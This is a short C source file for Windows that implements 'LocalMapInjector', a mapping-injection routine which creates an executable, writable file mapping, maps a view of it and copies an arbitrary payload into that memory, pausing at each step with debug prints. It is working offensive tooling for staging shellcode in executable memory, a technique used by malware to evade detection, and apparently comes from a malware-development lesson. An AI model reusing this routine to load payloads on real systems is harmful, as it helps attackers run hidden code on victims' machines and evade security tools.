#include "MappingInjection.h"

BOOL LocalMapInjector(PBYTE pPayload, SIZE_T sPayloadSize, PVOID* ppAddress) {

	HANDLE	hFile					= NULL;
	SIZE_T	NumberOfWrittenBytes	= 0;
	

	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (!hFile) {
		printf("[!] CreateFileMappingA Failed with Error: %ld\n", GetLastError());
		goto _RETURN;
	}

	printf("[+] File Mapping Created, press enter to map view...\n");
	getchar();

	*ppAddress = MapViewOfFile(hFile, FILE_MAP_EXECUTE | FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (!*ppAddress) {
		printf("[!] MapViewOfFile Faield with Error: %ld\n", GetLastError());
		goto _RETURN;
	}

	printf("[+] Map was viewed, press enter to write memory... | pAddress: %p\n", *ppAddress);
	getchar();

	/*if (!WriteProcessMemory(GetCurrentProcess(), *ppAddress, pPayload, sPayloadSize, &NumberOfWrittenBytes)) {
		printf("[!] WriteProcessMemory Failed with Error: %ld\n", GetLastError());
		goto _RETURN;
	}*/

	memcpy(*ppAddress, pPayload, sPayloadSize);

	printf("[+] Wrote the memory | NumberOfWrittenBytes: %d\n", NumberOfWrittenBytes);
	getchar();

_RETURN:
	if (hFile)
		CloseHandle(hFile);
	if (!*ppAddress)
		return FALSE;
	return TRUE;
}